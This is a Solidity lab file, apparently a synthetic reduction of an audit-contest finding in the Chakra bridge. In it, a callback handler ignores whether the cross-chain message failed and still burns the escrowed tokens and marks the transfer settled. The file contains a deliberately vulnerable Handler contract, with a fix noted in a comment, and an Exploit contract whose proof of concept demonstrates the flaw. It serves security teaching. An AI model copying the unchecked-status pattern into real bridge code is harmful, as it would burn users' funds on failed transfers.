// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Chakra — callback always settles and burns (Code4rena H-12, August 2024)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the Cairo handler's receive_cross_chain_callback ignores
    cross_chain_msg_status. MintBurn mode always burns the escrow and writes
    tx_status = SETTLED, including when the destination message failed.
    The Solidity handler in the same contest burns only on Success. */

contract BridgeToken {
    string public symbol = "CHK";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract BurnSink {}

contract Handler {
    uint8 public constant MODE_MINT_BURN = 1;
    uint8 public constant SETTLED = 2;
    uint8 public mode = MODE_MINT_BURN;
    BridgeToken public token;
    address public sink;

    struct Created {
        uint256 amount;
        uint8 status;
    }

    mapping(uint256 => Created) public created;

    constructor(BridgeToken token_, address sink_) {
        token = token_;
        sink = sink_;
    }

    function create(uint256 id, uint256 amount) external {
        token.mint(address(this), amount);
        created[id] = Created(amount, 0);
    }

    function receive_cross_chain_callback(uint256 id, uint8 crossChainMsgStatus) external returns (bool) {
        Created memory createdTx = created[id];
        if (mode == MODE_MINT_BURN) {
            token.transfer(sink, createdTx.amount);
        }
        created[id] = Created({amount: createdTx.amount, status: SETTLED}); // @> VULN: crossChainMsgStatus is ignored, Failed still becomes SETTLED
        // FIX: if (crossChainMsgStatus != SUCCESS) { created[id].status = FAILED; return true; }
        return true;
    }
}

contract Exploit {
    BridgeToken public token; // CREATE nonce 1
    BurnSink public sink; // CREATE nonce 2
    Handler public handler; // CREATE nonce 3

    constructor() {
        token = new BridgeToken();
        sink = new BurnSink();
        handler = new Handler(token, address(sink));
    }

    function run() external {
        handler.create(1, 1000 ether);
        uint8 failed = 1;
        handler.receive_cross_chain_callback(1, failed);
        (, uint8 status) = handler.created(1);
        require(failed == 1, "destination failed");
        require(status == handler.SETTLED(), "not settled");
        require(token.balanceOf(address(handler)) == 0, "escrow remains");
        require(token.balanceOf(address(sink)) == 1000 ether, "not burned");
    }
}
